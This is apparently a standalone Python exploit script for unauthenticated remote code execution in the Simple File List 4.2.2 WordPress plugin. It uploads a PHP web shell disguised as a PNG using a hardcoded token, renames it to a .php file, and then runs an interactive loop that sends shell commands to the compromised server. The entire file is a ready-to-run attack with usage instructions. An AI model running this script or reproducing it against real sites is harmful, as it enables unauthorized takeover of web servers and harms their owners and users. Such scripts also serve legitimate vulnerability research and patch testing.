#!/usr/bin/env python3
# Title: Unauthenticated Remote Code Execution in Simple File List 4.2.2
# Author: Jessi
# Usage: python3 sfl_rce.py <target_url>

import requests
import os
import sys

# Warn if args = 0
if len(sys.argv) <= 1:
    print("Usage: python3 sfl_rce.py <target_url> (ex: python3 sfl_rce.py http://example.com)")
    exit(1)

# Set target
target = sys.argv[1]

# Paths
dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'
payload = '''<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>'''



# Write payload file
print("[!] Writing payload")
with open ('s.png', 'wb') as f:
    f.write(payload.encode())
print("[+] Payload written to s.png")



# Stage 1 - upload 
print("[!] Sending stage 1")
files = {'file': ('s.png', open('s.png', 'rb'), 'image/png')}
datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path, 'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
r = requests.post(url=f'{target}{upload_path}', data=datas, files=files, verify=False)
print("[+] Stage 1 sent")



# Stage 2 - move
print("[!] Sending stage 2")
headers = {'Referer': f'{target}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1', 'X-Requested-With': 'XMLHttpRequest'}
datas2 = {'eeSFL_ID': 1, 'eeFileOld': 's.png', 'eeListFolder': '/', 'eeFileAction': f'Rename|s.php'}
r2 = requests.post(url=f'{target}{move_path}', data=datas2, headers=headers, verify=False)



# Stage 3 - RCE
print("[+] Spawning shell")
while True:
    cmd = input('simple #> ')
    if cmd == 'clear':
        os.system('clear')
    elif cmd == 'exit':
        exit(0)
    r3 = requests.get(url=f'{target}{dir_path}s.php?cmd={cmd}')
    print(r3.text)
